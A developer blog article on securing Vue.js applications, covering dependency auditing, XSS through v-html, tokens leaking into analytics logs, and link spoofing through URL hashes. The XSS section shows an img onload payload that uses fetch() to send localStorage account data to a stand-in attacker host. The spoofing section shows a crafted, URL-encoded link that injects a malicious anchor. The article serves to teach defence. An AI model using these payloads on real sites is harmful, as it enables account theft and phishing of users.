---
title: 'Fortifying Vue.js Applications'
excerpt: 'This article discusses the top security vulnerabilities in Vue.js applications and provides recommendations for identifying and mitigating the risks.'
publishDate: 2023-02-23
image: '/images/articles/security.jpeg'
category: 'Security'
subtitle: ' Developers usually rely on their tools too much without considering the consequences.'
readTime: '8 min read'
---


There is a widespread mental model called [Second-Order Thinking](https://fs.blog/second-order-thinking/), which says that when coming up with a solution don't think just about the problem you are solving but also the implications.

*Sure, we are solving this with feature X, but we may introduce another step in the flow that will drop the conversion rate, or SEO might go down, and so on…*

Often, when solving a problem or adding a feature, we mistakenly open the door for vulnerabilities in our website and they get overlooked and lay there in waiting like a ticking time bomb until one day you are on the first page of hacker news.

I want to stress that these vulnerabilities are not Vue’s fault. Vue offers a set of tools and APIs that help enhance the User Experience of your website, it's the developer who has to make sure how not to misuse these tools and open up his business to attackers.

## Third-party libraries and Scripts

<img src="/images/articles/node-modules.webp" alt="Node modules are big" />

The most common entry point in your application is your package.json file. It should have a disclaimer at the top that says:

*Attention! Here be dragons!*

You usually want to use a popular framework or add a cool new library to your project and when you do you are potentially opening the door to malicious content.

With a simple `npm i amazing-library@2.0` even if amazing-library does not have any vulnerabilities, the installer will download the library's own dependencies and install them as well, and again for each dependency of that dependency and so on.

Thankfully npm provides an audit of every installed package and it gives a score of `low` / `medium` / `high` to each vulnerability it finds.

You then can run `npm audit fix` or `npm audit fix --force` to attempt to fix your installed packages. I want to stress the word attempt because in the Javascript world [things are not so simple](https://twitter.com/neciudan/status/1625800147757064193).


<img src="/images/articles/twitter.webp" alt="Security in Javascript" />


GitHub also has a vulnerability checker called [dependaBot](https://github.com/dependabot), that checks each PR for new updates or if you are introducing a library/package that is vulnerable.

Unfortunately, npm and dependaBot, catch these problems only *after* packages have been flagged as vulnerable. So by the time you update your package.json file, it may already be too late.

A couple of best practices when installing libraries:

- check if the library/package is well maintained
- do regular checks using npm audit for your package.json
- install dependaBot in your GitHub repos

Obviously, this is not Vue.js specific and it affects every library and framework, the good news here is that [Vue core members take security very seriously](https://vuejs.org/guide/best-practices/security.html#best-practices) and I consider the Vue ecosystem to be safer than most.

So if you stick with Vue packages from the Vue ecosystem (Vue, Vite, Vitest, VueUse, etc), chances are you are probably safe.

## Cross-Site Scripting (XSS)

<img src="/images/articles/xss.webp" alt="XSS explained" /> 

Cross-Site Scripting or XSS has been in the [OWASP Top Ten](https://owasp.org/www-project-top-ten/) every year for the past decade, and in 2022 has reached the third position.

*Uhhh hooray for XSS ?*

An XSS vulnerability happens when an attacker manages to inject malicious code inside an application.

This malicious script is then executed by the Normal Users browser and the code can access cookie data, local storage, or other browser-related information.

A typical example is a Comment Form Component rendered inside an Article. An attacker would add a comment like:

```
<script>alert('XSS')</script>
```
When other users would open the article, if the article is rendered in an element, the script would execute.

```
<p v-html="comment"></p>`
```
Typically you would do this when you want users to be able to add markdown to their comments or the ability to bold certain words.

Now, Vue is pretty smart in detecting script tags and prevents them by default. Unfortunately, attackers rarely use them, instead, they usually do something like this.


```
This is a comment!

<img 
  src="https://twitter.com/img/profile.jpg" 
  style="display:none" 
  onload="alert('XSS')"
/>
```
Inside the onload or onerrormethods the attacker would make a fetch request and send the user entire cookies or local storage.

```
<img 
  src="https://twitter.com/img/profile.jpg"
  style="display:none" 
  onload="fetch('https://attacker-url.net/', {method: 'POST', body: localStorage.getItem('account')})"
>
```
Pretty scary, right?

The good news is that it’s totally avoidable. The recommended solution is to not use `v-html` for user-generated content. That way we all sleep better at night.

But if you absolutely must use it, for some reason only you and your corporate overlords know, you must sanitize the user input.

[Sanitise-html](https://www.npmjs.com/package/sanitize-html) is a popular library that handles this well.

Another best practice is to also validate proper user input on the backend side and prevent malicious code from reaching the DB.

## Security Logging

<img src="/images/articles/o11y.webp" alt="Observability" /> 

**We measure everything.**

Page views, clicks, events, errors, how much the user is scrolling, heatmaps, and all sorts of user-related data that we can use to determine if what we are building actually works.

And unfortunately, we sometimes might send a little too much.

Typically we use third-party SaaS tools like Datadog, New Relic, Google Analytics, or any number of observability tools.

That means that every security vulnerability we send from our front-end client is stored in a database that you have no control over.

**What Security Vulnerabilities are we sending?**

The most common vulnerable data we are sending is:

- reset password tokens
- promo codes
- checkout generated links

Why does this happen? Because we are using query params in the URL for sensitive data.

`https://your-website.com/reset-password?token=AXSNNm123`

When this happens, our third-party o11y library of choice will log this URL as visited.

If an attacker gets access to your logged data, they can use these tokens to hijack user accounts or get access to unused promo codes, or visit checkout links and get access to user card information.

To prevent this it’s recommended to not use query params and use hashes instead.

`https://your-website.com/reset-password#token=AXSNm123`

Hashes are normally not logged or persisted in observability tools.

Most importantly: it is recommended you audit your URLs and pages to make sure you do not show user data on public pages.

For example:

`https://your-website.com/order/1231233212`

If this URL is accessed by someone other than the User who created the order, we must not show sensitive data like card information or the user's address.

## Spoofing

<img src="/images/articles/spoofing.webp" alt="Spoofing" /> 

Phishing and Spoofing have gotten very creative over the years.

And while both employ similar tactics to achieve their result, to take the user to their own website and try to steal their password or information, they achieve this in different ways.

Phishing would fake an official email and inside the call to action, they will redirect you to their own website.

I cannot even count the number of fake Jira Emails or AWS Emails I have received trying to make me click and steal my password.

Normally email clients catch this and all you have to do is be vigilant: check the sender, the content, and that the link you are going to has the correct domain name.

Spoofing on the other hand is way more dangerous because it takes advantage of your website's flaw to redirect you to another website.

Think of a page where you can add promo codes. You would probably send marketing emails to your users with an URL like:

`https://your-website/promos#PROMO300`

And on the page show the promo code in a nice way with an APPLY PROMO button.

In your code, you may grab the promo code using `location.hash` and then render it using the `v-html` tag.

By using the `v-html` tag in this situation you have opened up the Spoofing vulnerability.

A creative attacker can create a very nice-looking HTML using your URL like this:

`https://your-website/promos#<div>PROMO is APXS1230 <br/> <a href="https://other-malicious-website.com">Click here to apply</a></div>`

Of course the above looks malicious, but encoded it will look like this:

`https://your-website/promos#%3Cdiv%3EPROMO%20is%20APXS1230%20%3Cbr%2F%3E%20%3Ca%20href%3D%22https%3A%2F%2Fother-malicious-website.com%22%3EClick%20here%20to%20apply%3C%2Fa%3E%3C%2Fdiv%3E`

Not that easy to spot it now, is it?

The attacker will take advantage of the sense of security your users will feel when on your website and not think twice about clicking on a link.

Specifically on promotions-related pages.

Like in the case of XSS the best approach is to never use v-html or {{}} to render user content or content from the URL / Cookies or another medium the attacker can exploit.

## Conclusion

To minimize the risk of security vulnerabilities, it’s important to follow best practices, such as validating user input, using encryption for sensitive data, and implementing proper access controls.

Additionally, implementing security logging and monitoring can help detect and respond to potential security threats. As well as activating dependency checks in your pipeline (npm audit, dependabot)

And the best advice comes from the Vue Documentation page itself:

<img src="/images/articles/warning.webp" alt="Warning" /> 

Always sanitize user input and try not to render using v-html anything that can be abused by attackers (URLs, Cookies, User Generated Content)

